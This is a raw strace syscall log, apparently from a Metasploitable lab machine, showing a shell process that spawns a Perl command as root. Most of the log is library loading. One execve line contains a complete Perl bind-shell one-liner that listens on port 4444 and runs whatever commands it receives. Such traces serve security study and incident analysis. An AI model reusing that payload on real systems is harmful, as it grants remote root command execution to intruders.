18999 12:57:07.331629 mmap2(NULL, 96232, PROT_READ|PROT_EXEC, MAP_PRIVATE|MAP_DENYWRITE, 1, 0) = 0xb7dce000
18999 12:57:07.331640 mmap2(0xb7de2000, 8192, PROT_READ|PROT_WRITE, MAP_PRIVATE|MAP_FIXED|MAP_DENYWRITE, 1, 0x13) = 0xb7de2000
18999 12:57:07.331655 mmap2(0xb7de4000, 6120, PROT_READ|PROT_WRITE, MAP_PRIVATE|MAP_FIXED|MAP_ANONYMOUS, -1, 0) = 0xb7de4000
18999 12:57:07.331669 close(1)          = 0
18999 12:57:07.331696 munmap(0xb7f74000, 29913) = 0
18999 12:57:07.331714 open("/etc/ld.so.cache", O_RDONLY) = 1
18999 12:57:07.331727 fstat64(1, {st_mode=S_IFREG|0644, st_size=29913, ...}) = 0
18999 12:57:07.331743 mmap2(NULL, 29913, PROT_READ, MAP_PRIVATE, 1, 0) = 0xb7f74000
18999 12:57:07.331754 close(1)          = 0
18999 12:57:07.331764 access("/etc/ld.so.nohwcap", F_OK) = -1 ENOENT (No such file or directory)
18999 12:57:07.331779 open("/lib/tls/i686/cmov/libnss_nis.so.2", O_RDONLY) = 1
18999 12:57:07.331793 read(1, "\177ELF\1\1\1\0\0\0\0\0\0\0\0\0\3\0\3\0\1\0\0\0\20\31\0\0004\0\0\0\320\201\0\0\0\0\0\0004\0 \0\10\0(\0\34\0\33\0\6\0\0\0004\0\0\0004\0\0\0004\0\0\0\0\1\0\0\0\1\0\0\5\0\0\0\4\0\0\0\3\0\0\0\350x\0\0\350x\0\0\350x\0\0\23\0\0\0\23\0\0\0\4\0\0\0\1\0\0\0\1\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\310}\0\0\310}\0\0\5\0\0\0\0\20\0\0\1\0\0\0\334~\0\0\334\216\0\0\334\216\0\0\374\1\0\0`\3\0\0\6\0\0\0\0\20\0\0\2\0\0\0\360~\0\0\360\216\0\0\360\216\0\0\360\0\0\0\360\0\0\0\6\0\0\0\4\0\0\0\4\0\0\0004\1\0\0004\1\0\0004\1\0\0 \0\0\0 \0\0\0\4\0\0\0\4\0\0\0Q\345td\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\6\0\0\0\4\0\0\0R\345td\334~\0\0\334\216\0\0\334\216\0\0\30\1\0\0\30\1\0\0\4\0\0\0\1\0\0\0\4\0\0\0\20\0\0\0\1\0\0\0GNU\0\0\0\0\0\2\0\0\0\6\0\0\0\10\0\0\0g\0\0\0000\0\0\0\20\0\0\0\t\0\0\0\2\0\0H  \26\20\0\0@g\3\0\3\6\30\24\0248A\30&\243\301\200\212\0048\21\10 B@\310\24\344\20\311\244\10\0\4\0\0@\0P!\0\0\204\0\0\0\0@\v\0y\243\0D\202\0\0\0\0000\0\0\0001\0\0\0\0\0\0\0002\0\0\0003\0\0\0004\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0005\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0006\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0007\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0", 512) = 512
18999 12:57:07.331883 fstat64(1, {st_mode=S_IFREG|0644, st_size=34352, ...}) = 0
18999 12:57:07.331907 mmap2(NULL, 37436, PROT_READ|PROT_EXEC, MAP_PRIVATE|MAP_DENYWRITE, 1, 0) = 0xb7dc4000
18999 12:57:07.331921 mmap2(0xb7dcc000, 8192, PROT_READ|PROT_WRITE, MAP_PRIVATE|MAP_FIXED|MAP_DENYWRITE, 1, 0x7) = 0xb7dcc000
18999 12:57:07.331964 close(1)          = 0
18999 12:57:07.331977 access("/etc/ld.so.nohwcap", F_OK) = -1 ENOENT (No such file or directory)
18999 12:57:07.332005 open("/lib/tls/i686/cmov/libnss_files.so.2", O_RDONLY) = 1
18999 12:57:07.332023 read(1, "\177ELF\1\1\1\0\0\0\0\0\0\0\0\0\3\0\3\0\1\0\0\0\340\30\0\0004\0\0\0\254\221\0\0\0\0\0\0004\0 \0\10\0(\0\34\0\33\0\6\0\0\0004\0\0\0004\0\0\0004\0\0\0\0\1\0\0\0\1\0\0\5\0\0\0\4\0\0\0\3\0\0\0\330\206\0\0\330\206\0\0\330\206\0\0\23\0\0\0\23\0\0\0\4\0\0\0\1\0\0\0\1\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\240\213\0\0\240\213\0\0\5\0\0\0\0\20\0\0\1\0\0\0\350\216\0\0\350\236\0\0\350\236\0\0\314\1\0\0\260\3\0\0\6\0\0\0\0\20\0\0\2\0\0\0\374\216\0\0\374\236\0\0\374\236\0\0\340\0\0\0\340\0\0\0\6\0\0\0\4\0\0\0\4\0\0\0004\1\0\0004\1\0\0004\1\0\0 \0\0\0 \0\0\0\4\0\0\0\4\0\0\0Q\345td\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\6\0\0\0\4\0\0\0R\345td\350\216\0\0\350\236\0\0\350\236\0\0\f\1\0\0\f\1\0\0\4\0\0\0\1\0\0\0\4\0\0\0\20\0\0\0\1\0\0\0GNU\0\0\0\0\0\2\0\0\0\6\0\0\0\10\0\0\0k\0\0\0.\0\0\0\20\0\0\0\t\0\0\0\"F\340\24\240\240\245\1\31\10\200\20\203\6\212\10\0\0\222@]\1(\nx\10 \"\220\200\20,\5\1\204\4)!\0224\0\24\0\31\0\0\2\2\210@\0\200@0\210\201@@\200\0B\0\6\300.\0\0\0\0\0\0\0\0\0\0\0/\0\0\0000\0\0\0001\0\0\0002\0\0\0003\0\0\0\0\0\0\0004\0\0\0\0\0\0\0005\0\0\0007\0\0\0008\0\0\0\0\0\0\0:\0\0\0\0\0\0\0;\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0", 512) = 512
18999 12:57:07.332113 fstat64(1, {st_mode=S_IFREG|0644, st_size=38412, ...}) = 0
18999 12:57:07.332131 mmap2(NULL, 41624, PROT_READ|PROT_EXEC, MAP_PRIVATE|MAP_DENYWRITE, 1, 0) = 0xb7db9000
18999 12:57:07.332142 mmap2(0xb7dc2000, 8192, PROT_READ|PROT_WRITE, MAP_PRIVATE|MAP_FIXED|MAP_DENYWRITE, 1, 0x8) = 0xb7dc2000
18999 12:57:07.332158 close(1)          = 0
18999 12:57:07.332179 munmap(0xb7f74000, 29913) = 0
18999 12:57:07.332195 open("/etc/passwd", O_RDONLY|0x80000 /* O_??? */) = 1
18999 12:57:07.332210 fcntl64(1, F_GETFD) = 0x1 (flags FD_CLOEXEC)
18999 12:57:07.332222 _llseek(1, 0, [0], SEEK_CUR) = 0
18999 12:57:07.332234 fstat64(1, {st_mode=S_IFREG|0644, st_size=1624, ...}) = 0
18999 12:57:07.332250 mmap2(NULL, 1624, PROT_READ, MAP_SHARED, 1, 0) = 0xb7f7b000
18999 12:57:07.332261 _llseek(1, 1624, [1624], SEEK_SET) = 0
18999 12:57:07.332276 munmap(0xb7f7b000, 1624) = 0
18999 12:57:07.332286 close(1)          = 0
18999 12:57:07.332315 getpgrp()         = 3831
18999 12:57:07.332326 rt_sigaction(SIGCHLD, {0x807e540, [], 0}, {SIG_DFL}, 8) = 0
18999 12:57:07.332341 getrlimit(RLIMIT_NPROC, {rlim_cur=8191, rlim_max=8191}) = 0
18999 12:57:07.332357 brk(0x8101000)    = 0x8101000
18999 12:57:07.332389 rt_sigprocmask(SIG_BLOCK, NULL, [], 8) = 0
18999 12:57:07.332413 rt_sigprocmask(SIG_BLOCK, NULL, [], 8) = 0
18999 12:57:07.332456 rt_sigprocmask(SIG_BLOCK, NULL, [], 8) = 0
18999 12:57:07.332509 brk(0x8102000)    = 0x8102000
18999 12:57:07.332536 stat64(".", {st_mode=S_IFDIR|0700, st_size=4096, ...}) = 0
18999 12:57:07.332556 stat64("/sbin/AB", 0xbfb871d8) = -1 ENOENT (No such file or directory)
18999 12:57:07.332568 stat64("/bin/AB", 0xbfb871d8) = -1 ENOENT (No such file or directory)
18999 12:57:07.332579 stat64("/usr/sbin/AB", 0xbfb871d8) = -1 ENOENT (No such file or directory)
18999 12:57:07.332591 stat64("/usr/bin/AB", 0xbfb871d8) = -1 ENOENT (No such file or directory)
18999 12:57:07.332605 rt_sigprocmask(SIG_BLOCK, [INT CHLD], [], 8) = 0
18999 12:57:07.332619 clone(child_stack=0, flags=CLONE_CHILD_CLEARTID|CLONE_CHILD_SETTID|SIGCHLD, child_tidptr=0xb7def6f8) = 19000
19000 12:57:07.332665 rt_sigprocmask(SIG_SETMASK, [], NULL, 8) = 0
19000 12:57:07.332683 rt_sigaction(SIGTSTP, {SIG_DFL}, {SIG_DFL}, 8) = 0
19000 12:57:07.332696 rt_sigaction(SIGTTIN, {SIG_DFL}, {SIG_DFL}, 8) = 0
19000 12:57:07.332708 rt_sigaction(SIGTTOU, {SIG_DFL}, {SIG_DFL}, 8) = 0
19000 12:57:07.332724 rt_sigaction(SIGINT, {SIG_DFL}, {SIG_DFL}, 8) = 0
19000 12:57:07.332739 rt_sigaction(SIGQUIT, {SIG_IGN}, {SIG_IGN}, 8) = 0
19000 12:57:07.332752 rt_sigaction(SIGCHLD, {SIG_DFL}, {0x807e540, [], 0}, 8) = 0
19000 12:57:07.332807 write(2, "sh: AB: command not found\n", 26) = -1 EPIPE (Broken pipe)
19000 12:57:07.332821 --- SIGPIPE (Broken pipe) @ 0 (0) ---
19000 12:57:07.332889 exit_group(127)   = ?
18999 12:57:07.348109 rt_sigprocmask(SIG_SETMASK, [],  <unfinished ...>
4519  12:57:07.348136 waitpid(18999,  <unfinished ...>
18999 12:57:07.348157 <... rt_sigprocmask resumed> NULL, 8) = 0
18999 12:57:07.367135 --- SIGCHLD (Child exited) @ 0 (0) ---
18999 12:57:07.367156 waitpid(-1, [{WIFEXITED(s) && WEXITSTATUS(s) == 127}], WNOHANG) = 19000
18999 12:57:07.367177 waitpid(-1, 0xbfb86e58, WNOHANG) = -1 ECHILD (No child processes)
18999 12:57:07.367189 sigreturn()       = ? (mask now [])
18999 12:57:07.367213 rt_sigprocmask(SIG_BLOCK, [CHLD], [], 8) = 0
18999 12:57:07.367229 rt_sigprocmask(SIG_SETMASK, [], NULL, 8) = 0
18999 12:57:07.367240 rt_sigprocmask(SIG_BLOCK, [CHLD], [], 8) = 0
18999 12:57:07.367253 rt_sigaction(SIGINT, {0x807f150, [], 0}, {SIG_DFL}, 8) = 0
18999 12:57:07.367272 rt_sigprocmask(SIG_SETMASK, [], NULL, 8) = 0
18999 12:57:07.367284 rt_sigaction(SIGINT, {SIG_DFL}, {0x807f150, [], 0}, 8) = 0
18999 12:57:07.367320 stat64(".", {st_mode=S_IFDIR|0700, st_size=4096, ...}) = 0
18999 12:57:07.367341 stat64("/sbin/perl", 0xbfb87208) = -1 ENOENT (No such file or directory)
18999 12:57:07.367354 stat64("/bin/perl", 0xbfb87208) = -1 ENOENT (No such file or directory)
18999 12:57:07.367365 stat64("/usr/sbin/perl", 0xbfb87208) = -1 ENOENT (No such file or directory)
18999 12:57:07.367377 stat64("/usr/bin/perl", {st_mode=S_IFREG|0755, st_size=1080724, ...}) = 0
18999 12:57:07.367395 stat64("/usr/bin/perl", {st_mode=S_IFREG|0755, st_size=1080724, ...}) = 0
18999 12:57:07.367421 rt_sigprocmask(SIG_BLOCK, [INT CHLD], [], 8) = 0
18999 12:57:07.367436 clone(child_stack=0, flags=CLONE_CHILD_CLEARTID|CLONE_CHILD_SETTID|SIGCHLD, child_tidptr=0xb7def6f8) = 19001
19001 12:57:07.367488 rt_sigprocmask(SIG_SETMASK, [], NULL, 8) = 0
19001 12:57:07.367505 rt_sigaction(SIGTSTP, {SIG_DFL}, {SIG_DFL}, 8) = 0
19001 12:57:07.367519 rt_sigaction(SIGTTIN, {SIG_DFL}, {SIG_DFL}, 8) = 0
19001 12:57:07.367531 rt_sigaction(SIGTTOU, {SIG_DFL}, {SIG_DFL}, 8) = 0
19001 12:57:07.367546 rt_sigaction(SIGINT, {SIG_DFL}, {SIG_DFL}, 8) = 0
19001 12:57:07.367561 rt_sigaction(SIGQUIT, {SIG_IGN}, {SIG_IGN}, 8) = 0
19001 12:57:07.367574 rt_sigaction(SIGCHLD, {SIG_DFL}, {0x807e540, [], 0}, 8) = 0
19001 12:57:07.367696 execve("/usr/bin/perl", ["perl", "-MIO", "-e", "$p=fork();exit,if$p;foreach my $key(keys %ENV){if($ENV{$key}=~/(.*)/){$ENV{$key}=$1;}}$c=new IO::Socket::INET(LocalPort,4444,Reuse,1,Listen)->accept;$~->fdopen($c,w);STDIN->fdopen($c,r);while(<>){if($_=~ /(.*)/){system $1;}};"], [/* 14 vars */]) = 0
19001 12:57:07.367789 brk(0)            = 0x8153000
19001 12:57:07.367809 access("/etc/ld.so.nohwcap", F_OK) = -1 ENOENT (No such file or directory)
19001 12:57:07.367826 mmap2(NULL, 8192, PROT_READ|PROT_WRITE, MAP_PRIVATE|MAP_ANONYMOUS, -1, 0) = 0xb7ee7000
19001 12:57:07.367842 access("/etc/ld.so.preload", R_OK) = -1 ENOENT (No such file or directory)
19001 12:57:07.367861 open("/etc/ld.so.cache", O_RDONLY) = 1
19001 12:57:07.367874 fstat64(1, {st_mode=S_IFREG|0644, st_size=29913, ...}) = 0
19001 12:57:07.367891 mmap2(NULL, 29913, PROT_READ, MAP_PRIVATE, 1, 0) = 0xb7edf000
19001 12:57:07.367902 close(1)          = 0
19001 12:57:07.367913 access("/etc/ld.so.nohwcap", F_OK) = -1 ENOENT (No such file or directory)
19001 12:57:07.367928 open("/lib/tls/i686/cmov/libdl.so.2", O_RDONLY) = 1
19001 12:57:07.367943 read(1, "\177ELF\1\1\1\0\0\0\0\0\0\0\0\0\3\0\3\0\1\0\0\0p\n\0\0004\0\0\0L!\0\0\0\0\0\0004\0 \0\10\0(\0\35\0\34\0\6\0\0\0004\0\0\0004\0\0\0004\0\0\0\0\1\0\0\0\1\0\0\5\0\0\0\4\0\0\0\3\0\0\0003\33\0\0003\33\0\0003\33\0\0\23\0\0\0\23\0\0\0\4\0\0\0\1\0\0\0\1\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\374\34\0\0\374\34\0\0\5\0\0\0\0\20\0\0\1\0\0\0\264\36\0\0\264.\0\0\264.\0\0\230\1\0\0\310\1\0\0\6\0\0\0\0\20\0\0\2\0\0\0\320\36\0\0\320.\0\0\320.\0\0\370\0\0\0\370\0\0\0\6\0\0\0\4\0\0\0\4\0\0\0004\1\0\0004\1\0\0004\1\0\0 \0\0\0 \0\0\0\4\0\0\0\4\0\0\0Q\345td\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\6\0\0\0\4\0\0\0R\345td\264\36\0\0\264.\0\0\264.\0\0@\1\0\0@\1\0\0\4\0\0\0\1\0\0\0\4\0\0\0\20\0\0\0\1\0\0\0GNU\0\0\0\0\0\2\0\0\0\6\0\0\0\10\0\0\0\26\0\0\0\31\0\0\0\4\0\0\0\7\0\0\0\230\0\21\0\0B\0\0\202\0`\10\223(\10\336\31\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\32\0\0\0\0\0\0\0\33\0\0\0\34\0\0\0\0\0\0\0\36\0\0\0\0\0\0\0\0\0\0\0\37\0\0\0!\0\0\0\"\0\0\0\0\0\0\0\0\0\0\0#\0\0\0%\0\0\0&\0\0\0\0\0\0\0(\0\0\0\221!\374\370\225\263_\31\5\350\7\371\6\2\4\371\7\2\4\371\301S\200\30\256\304M\17a\242\222\6\325=l\366\327=l\366\370\31sB\353\26\251\30\373\31sB", 512) = 512
19001 12:57:07.368040 fstat64(1, {st_mode=S_IFREG|0644, st_size=9684, ...}) = 0
19001 12:57:07.368057 mmap2(NULL, 12412, PROT_READ|PROT_EXEC, MAP_PRIVATE|MAP_DENYWRITE, 1, 0) = 0xb7edb000
19001 12:57:07.368069 mmap2(0xb7edd000, 8192, PROT_READ|PROT_WRITE, MAP_PRIVATE|MAP_FIXED|MAP_DENYWRITE, 1, 0x1) = 0xb7edd000
19001 12:57:07.368086 close(1)          = 0
19001 12:57:07.368097 access("/etc/ld.so.nohwcap", F_OK) = -1 ENOENT (No such file or directory)
19001 12:57:07.368111 open("/lib/tls/i686/cmov/libm.so.6", O_RDONLY) = 1
19001 12:57:07.368126 read(1, "\177ELF\1\1\1\0\0\0\0\0\0\0\0\0\3\0\3\0\1\0\0\0@4\0\0004\0\0\0PB\2\0\0\0\0\0004\0 \0\t\0(\0 \0\37\0\6\0\0\0004\0\0\0004\0\0\0004\0\0\0 \1\0\0 \1\0\0\5\0\0\0\4\0\0\0\3\0\0\0x\20\2\0x\20\2\0x\20\2\0\23\0\0\0\23\0\0\0\4\0\0\0\1\0\0\0\1\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0$/\2\0$/\2\0\5\0\0\0\0\20\0\0\1\0\0\0\334>\2\0\334>\2\0\334>\2\0`\1\0\0\244\1\0\0\6\0\0\0\0\20\0\0\2\0\0\0\360>\2\0\360>\2\0\360>\2\0\350\0\0\0\350\0\0\0\6\0\0\0\4\0\0\0\4\0\0\0T\1\0\0T\1\0\0T\1\0\0 \0\0\0 \0\0\0\4\0\0\0\4\0\0\0P\345td\214\20\2\0\214\20\2\0\214\20\2\0\34\4\0\0\34\4\0\0\4\0\0\0\4\0\0\0Q\345td\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\6\0\0\0\4\0\0\0R\345td\334>\2\0\334>\2\0\334>\2\0\30\1\0\0\30\1\0\0\4\0\0\0\1\0\0\0\4\0\0\0\20\0\0\0\1\0\0\0GNU\0\0\0\0\0\2\0\0\0\6\0\0\0\10\0\0\0\214\2\0\0\17\0\0\0@\0\0\0\v\0\0\0%\220 \305\t\204g\v\0\302\20 \4iER\202\20\200\240\0}\210\272\10\10I\0\0\0\0\0\33\4\201\0\0\0\232U\20A P \200\224\202\220\21@\3722\0\304a\24\0\10\6\306\220\232\f\207\300 \250\0  \202\0\230\201\4E\7\0054a\2\0\0\251C\30\310 \10\23\30\24M8\"\0\22\24\21@T\203\2E\1\1\1\244\fX\20\0\210\2\0 \0@\0$\214\5\10", 512) = 512
19001 12:57:07.368264 fstat64(1, {st_mode=S_IFREG|0644, st_size=149328, ...}) = 0
19001 12:57:07.368282 mmap2(NULL, 147584, PROT_READ|PROT_EXEC, MAP_PRIVATE|MAP_DENYWRITE, 1, 0) = 0xb7eb6000
19001 12:57:07.368294 mmap2(0xb7ed9000, 8192, PROT_READ|PROT_WRITE, MAP_PRIVATE|MAP_FIXED|MAP_DENYWRITE, 1, 0x23) = 0xb7ed9000
19001 12:57:07.368310 close(1)          = 0
19001 12:57:07.368322 access("/etc/ld.so.nohwcap", F_OK) = -1 ENOENT (No such file or directory)
19001 12:57:07.368336 open("/lib/tls/i686/cmov/libpthread.so.0", O_RDONLY) = 1
19001 12:57:07.368350 read(1, "\177ELF\1\1\1\0\0\0\0\0\0\0\0\0\3\0\3\0\1\0\0\0\20H\0\0004\0\0\0\330C\1\0\0\0\0\0004\0 \0\t\0(\0$\0!\0\6\0\0\0004\0\0\0004\0\0\0004\0\0\0 \1\0\0 \1\0\0\5\0\0\0\4\0\0\0\3\0\0\0\224\n\1\0\224\n\1\0\224\n\1\0\23\0\0\0\23\0\0\0\4\0\0\0\1\0\0\0\1\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\4;\1\0\4;\1\0\5\0\0\0\0\20\0\0\1\0\0\0\344=\1\0\344M\1\0\344M\1\0T\3\0\0\374#\0\0\6\0\0\0\0\20\0\0\2\0\0\0\324>\1\0\324N\1\0\324N\1\0\370\0\0\0\370\0\0\0\6\0\0\0\4\0\0\0\4\0\0\0T\1\0\0T\1\0\0T\1\0\0 \0\0\0 \0\0\0\4\0\0\0\4\0\0\0P\345td\250\n\1\0\250\n\1\0\250\n\1\0\314\4\0\0\314\4\0\0\4\0\0\0\4\0\0\0Q\345td\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\6\0\0\0\4\0\0\0R\345td\344=\1\0\344M\1\0\344M\1\0\20\2\0\0\20\2\0\0\4\0\0\0\1\0\0\0\4\0\0\0\20\0\0\0\1\0\0\0GNU\0\0\0\0\0\2\0\0\0\6\0\0\0\10\0\0\0\262\1\0\0L\0\0\0@\0\0\0\v\0\0\0\31!\2\221\1\n\20\"@H \331\3\0I4\200\0\0@\0 \200\200\21P`@@\22\213\0020D\0\0\20\0\0\2\0\1\r\0\204\n\360\1X\260\r\240\200\10 $\204\20B\242)m\10G\234V\20\0\224 \204$\10\0H(\1\222\34\301B\240\220\22\10\f \2\30`A\244c\4\0\n\32\3\0\0)\0(\314@\204\210L\22\10\241\0\4\0\10\0\300Q\0\2009\4C\300", 512) = 512
19001 12:57:07.368437 fstat64(1, {st_mode=S_IFREG|0755, st_size=112354, ...}) = 0
19001 12:57:07.368454 mmap2(NULL, 4096, PROT_READ|PROT_WRITE, MAP_PRIVATE|MAP_ANONYMOUS, -1, 0) = 0xb7eb5000
19001 12:57:07.368467 mmap2(NULL, 94688, PROT_READ|PROT_EXEC, MAP_PRIVATE|MAP_DENYWRITE, 1, 0) = 0xb7e9d000
19001 12:57:07.368477 mmap2(0xb7eb1000, 8192, PROT_READ|PROT_WRITE, MAP_PRIVATE|MAP_FIXED|MAP_DENYWRITE, 1, 0x13) = 0xb7eb1000
19001 12:57:07.368492 mmap2(0xb7eb3000, 4576, PROT_READ|PROT_WRITE, MAP_PRIVATE|MAP_FIXED|MAP_ANONYMOUS, -1, 0) = 0xb7eb3000
19001 12:57:07.368509 close(1)          = 0
19001 12:57:07.368521 access("/etc/ld.so.nohwcap", F_OK) = -1 ENOENT (No such file or directory)
19001 12:57:07.368534 open("/lib/tls/i686/cmov/libc.so.6", O_RDONLY) = 1
19001 12:57:07.368548 read(1, "\177ELF\1\1\1\0\0\0\0\0\0\0\0\0\3\0\3\0\1\0\0\0\260e\1\0004\0\0\0\4\307\24\0\0\0\0\0004\0 \0\n\0(\0D\0C\0\6\0\0\0004\0\0\0004\0\0\0004\0\0\0@\1\0\0@\1\0\0\5\0\0\0\4\0\0\0\3\0\0\0\2200\23\0\2200\23\0\2200\23\0\23\0\0\0\23\0\0\0\4\0\0\0\1\0\0\0\1\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0(\215\24\0(\215\24\0\5\0\0\0\0\20\0\0\1\0\0\0\354\221\24\0\354\221\24\0\354\221\24\0\260\'\0\0\204T\0\0\6\0\0\0\0\20\0\0\2\0\0\0\234\255\24\0\234\255\24\0\234\255\24\0\360\0\0\0\360\0\0\0\6\0\0\0\4\0\0\0\4\0\0\0t\1\0\0t\1\0\0t\1\0\0 \0\0\0 \0\0\0\4\0\0\0\4\0\0\0\7\0\0\0\354\221\24\0\354\221\24\0\354\221\24\0\10\0\0\0,\0\0\0\4\0\0\0\4\0\0\0P\345td\2440\23\0\2440\23\0\2440\23\0\354+\0\0\354+\0\0\4\0\0\0\4\0\0\0Q\345td\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\6\0\0\0\4\0\0\0R\345td\354\221\24\0\354\221\24\0\354\221\24\0\10\36\0\0\10\36\0\0\4\0\0\0\1\0\0\0\4\0\0\0\20\0\0\0\1\0\0\0GNU\0\0\0\0\0\2\0\0\0\6\0\0\0\10\0\0\0\363\3\0\0\n\0\0\0\0\2\0\0\16\0\0\0\2400\20D\200 \2\1\214\3\346\220AE\210\0\204\0\10\0A\200\0@\300\200\0\f\2\f\0\0010\0\10@\"\10\246\4\210H6l\240\0260\0&\204\200\216\4\10B$\2\f\246\244\32\6c\310\0\302 \1\300\0R\0!\201\10\4\n  \250\24\0\24(`\0\0P\240\312DB", 512) = 512
19001 12:57:07.368637 fstat64(1, {st_mode=S_IFREG|0755, st_size=1364388, ...}) = 0
19001 12:57:07.368655 mmap2(NULL, 1369712, PROT_READ|PROT_EXEC, MAP_PRIVATE|MAP_DENYWRITE, 1, 0) = 0xb7d4e000
19001 12:57:07.368674 mmap2(0xb7e97000, 12288, PROT_READ|PROT_WRITE, MAP_PRIVATE|MAP_FIXED|MAP_DENYWRITE, 1, 0x149) = 0xb7e97000
19001 12:57:07.368691 mmap2(0xb7e9a000, 9840, PROT_READ|PROT_WRITE, MAP_PRIVATE|MAP_FIXED|MAP_ANONYMOUS, -1, 0) = 0xb7e9a000
19001 12:57:07.368704 close(1)          = 0
19001 12:57:07.368717 access("/etc/ld.so.nohwcap", F_OK) = -1 ENOENT (No such file or directory)
19001 12:57:07.368730 open("/lib/tls/i686/cmov/libcrypt.so.1", O_RDONLY) = 1
19001 12:57:07.368745 read(1, "\177ELF\1\1\1\0\0\0\0\0\0\0\0\0\3\0\3\0\1\0\0\0000\7\0\0004\0\0\0<\221\0\0\0\0\0\0004\0 \0\10\0(\0\34\0\33\0\6\0\0\0004\0\0\0004\0\0\0004\0\0\0\0\1\0\0\0\1\0\0\5\0\0\0\4\0\0\0\3\0\0\0\340\210\0\0\340\210\0\0\340\210\0\0\23\0\0\0\23\0\0\0\4\0\0\0\1\0\0\0\1\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\f\212\0\0\f\212\0\0\5\0\0\0\0\20\0\0\1\0\0\0\350\216\0\0\350\236\0\0\350\236\0\0`\1\0\0tr\2\0\6\0\0\0\0\20\0\0\2\0\0\0\374\216\0\0\374\236\0\0\374\236\0\0\340\0\0\0\340\0\0\0\6\0\0\0\4\0\0\0\4\0\0\0004\1\0\0004\1\0\0004\1\0\0 \0\0\0 \0\0\0\4\0\0\0\4\0\0\0Q\345td\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\6\0\0\0\4\0\0\0R\345td\350\216\0\0\350\236\0\0\350\236\0\0\f\1\0\0\f\1\0\0\4\0\0\0\1\0\0\0\4\0\0\0\20\0\0\0\1\0\0\0GNU\0\0\0\0\0\2\0\0\0\6\0\0\0\10\0\0\0\17\0\0\0\22\0\0\0\2\0\0\0\6\0\0\0\4\311\240, \4\0\0\0\0\0\0\0\0\0\0\0\0\0\0\22\0\0\0\23\0\0\0\24\0\0\0\0\0\0\0\25\0\0\0\26\0\0\0\0\0\0\0\27\0\0\0\0\0\0\0\30\0\0\0\31\0\0\0\0\0\0\0k\31Qj\233(\375B\233`\205\33\327\16?\17I->\333\235C\r\375\313\373_\22\325=l\366\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0o\0\0\0\0\0\0\0\35\0\0\0\22\0\0\0\1\0\0\0\0\0\0\0\0\0\0\0 \0\0\0\37\0\0\0\0\0\0\0", 512) = 512
19001 12:57:07.368835 fstat64(1, {st_mode=S_IFREG|0644, st_size=38300, ...}) = 0
19001 12:57:07.368852 mmap2(NULL, 201052, PROT_READ|PROT_EXEC, MAP_PRIVATE|MAP_DENYWRITE, 1, 0) = 0xb7d1c000
19001 12:57:07.368863 mmap2(0xb7d25000, 8192, PROT_READ|PROT_WRITE, MAP_PRIVATE|MAP_FIXED|MAP_DENYWRITE, 1, 0x8) = 0xb7d25000
19001 12:57:07.368877 mmap2(0xb7d27000, 155996, PROT_READ|PROT_WRITE, MAP_PRIVATE|MAP_FIXED|MAP_ANONYMOUS, -1, 0) = 0xb7d27000
19001 12:57:07.368890 close(1)          = 0
19001 12:57:07.368914 mmap2(NULL, 4096, PROT_READ|PROT_WRITE, MAP_PRIVATE|MAP_ANONYMOUS, -1, 0) = 0xb7d1b000
19001 12:57:07.368927 set_thread_area({entry_number:-1 -> 6, base_addr:0xb7d1b8c0, limit:1048575, seg_32bit:1, contents:0, read_exec_only:0, limit_in_pages:1, seg_not_present:0, useable:1}) = 0
19001 12:57:07.368989 mprotect(0xb7e97000, 4096, PROT_READ) = 0
19001 12:57:07.369019 munmap(0xb7edf000, 29913) = 0
19001 12:57:07.369034 set_tid_address(0xb7d1b908) = 19001
19001 12:57:07.369043 set_robust_list(0xb7d1b910, 0xc) = 0
19001 12:57:07.369053 futex(0xbf8e4580, 0x81 /* FUTEX_??? */, 1) = 0
19001 12:57:07.369067 rt_sigaction(SIGRTMIN, {0xb7ea12c0, [], SA_SIGINFO}, NULL, 8) = 0
19001 12:57:07.369080 rt_sigaction(SIGRT_1, {0xb7ea1340, [], SA_RESTART|SA_SIGINFO}, NULL, 8) = 0
19001 12:57:07.369092 rt_sigprocmask(SIG_UNBLOCK, [RTMIN RT_1], NULL, 8) = 0
19001 12:57:07.369106 getrlimit(RLIMIT_STACK, {rlim_cur=8192*1024, rlim_max=RLIM_INFINITY}) = 0
19001 12:57:07.369126 uname({sys="Linux", node="metasploitable", ...}) = 0
19001 12:57:07.369180 rt_sigaction(SIGFPE, {SIG_IGN}, {SIG_DFL}, 8) = 0
19001 12:57:07.369227 brk(0)            = 0x8153000
19001 12:57:07.369237 brk(0x8174000)    = 0x8174000
19001 12:57:07.369282 getuid32()        = 0
19001 12:57:07.369292 geteuid32()       = 0
19001 12:57:07.369301 getgid32()        = 0
19001 12:57:07.369310 getegid32()       = 0
19001 12:57:07.369347 mmap2(NULL, 135168, PROT_READ|PROT_WRITE, MAP_PRIVATE|MAP_ANONYMOUS, -1, 0) = 0xb7cfa000
19001 12:57:07.369375 open("/dev/urandom", O_RDONLY|O_LARGEFILE) = 1
19001 12:57:07.369393 read(1, "\3\337\221\302", 4) = 4
19001 12:57:07.369410 close(1)          = 0
19001 12:57:07.369428 time(NULL)        = 1495645027
19001 12:57:07.369469 stat64("/usr/local/lib/site_perl/5.8.8/i486-linux-gnu-thread-multi", 0xbf8e4250) = -1 ENOENT (No such file or directory)
19001 12:57:07.369487 stat64("/usr/local/lib/site_perl/5.8.8", 0xbf8e4250) = -1 ENOENT (No such file or directory)
